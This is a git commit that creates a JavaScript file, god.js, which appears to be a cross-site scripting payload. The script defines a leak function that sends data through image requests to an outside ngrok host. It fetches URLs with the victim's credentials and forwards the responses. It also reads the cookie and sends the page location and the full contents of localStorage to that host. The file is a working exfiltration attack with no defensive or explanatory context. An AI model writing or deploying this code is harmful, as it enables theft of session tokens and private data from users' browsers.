dd27e62f75d629eb4005d9253b258f2617e2e187
Invaders0 <46098959+Invaders0@users.noreply.github.com>
2020-01-23 02:34:01 +0530

    Create god.js

---
+++ god.js
@@ -0,0 +1,36 @@
+leak = function(name, data)
+{
+   var i = document.createElement('img');
+   i.src = "http://b789a781.ngrok.io/?" + name + "=" + btoa(encodeURI(data));
+   document.body.appendChild(i); 
+}
+
+function reqListener () {
+   try {
+      data = unescape(encodeURIComponent(this.responseText));
+      leak("response", data);
+   }
+   catch(e)
+   {
+      leak("exception", e.name + ":" + e.message);
+   }
+   
+}
+
+get = function(url)
+{
+ 
+   var XHR = new XMLHttpRequest();
+   XHR.addEventListener('error', function( event ) {
+      leak("get_error","Something went wrong");
+   });
+   XHR.addEventListener('load', reqListener);
+   XHR.withCredentials = true;
+   XHR.open('GET', url);
+   XHR.send();
+}
+
+var csrf = document.cookie.split('=')[1];
+leak("location",JSON.stringify(document.location));
+leak("localstorage", JSON.stringify(localStorage));
+
